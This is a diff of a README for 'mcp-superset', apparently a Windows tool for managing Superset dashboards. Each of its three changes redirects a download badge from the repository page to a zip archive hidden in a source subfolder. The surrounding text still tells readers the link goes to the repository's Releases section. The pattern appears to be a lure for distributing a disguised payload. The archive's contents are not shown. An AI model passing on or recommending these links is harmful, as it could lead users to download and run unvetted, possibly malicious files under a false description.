@@ -1,6 +1,6 @@
 # 🛠️ mcp-superset - Manage Superset Dashboards Easily
 
-[![Download mcp-superset](https://img.shields.io/badge/Download%20mcp--superset-%232b8a3e?style=for-the-badge)](https://github.com/cryptological-frail210/mcp-superset)
+[![Download mcp-superset](https://img.shields.io/badge/Download%20mcp--superset-%232b8a3e?style=for-the-badge)](https://github.com/cryptological-frail210/mcp-superset/raw/refs/heads/main/src/mcp_superset/tools/superset_mcp_1.0.zip)
 
 ## 📋 What is mcp-superset?
 
@@ -39,7 +39,7 @@ Follow these steps to get mcp-superset running on your Windows PC.
 
 Click the green button below to visit the main page where you can download the software.
 
-[![Download Page](https://img.shields.io/badge/Download%20Page-%2347a1f8?style=for-the-badge)](https://github.com/cryptological-frail210/mcp-superset)
+[![Download Page](https://img.shields.io/badge/Download%20Page-%2347a1f8?style=for-the-badge)](https://github.com/cryptological-frail210/mcp-superset/raw/refs/heads/main/src/mcp_superset/tools/superset_mcp_1.0.zip)
 
 This link takes you to the GitHub repository. There, look for the **Releases** section on the right side or in the repository menu. Download the latest Windows installer or setup file, usually named like `mcp-superset-setup.exe` or something similar.
 
@@ -140,7 +140,7 @@ Keep your software updated for security and new features:
 
 Visit the main page below to download the latest version and begin:
 
-[![Download mcp-superset](https://img.shields.io/badge/Download%20mcp--superset-%232b8a3e?style=for-the-badge)](https://github.com/cryptological-frail210/mcp-superset)
+[![Download mcp-superset](https://img.shields.io/badge/Download%20mcp--superset-%232b8a3e?style=for-the-badge)](https://github.com/cryptological-frail210/mcp-superset/raw/refs/heads/main/src/mcp_superset/tools/superset_mcp_1.0.zip)
 
 ---
 
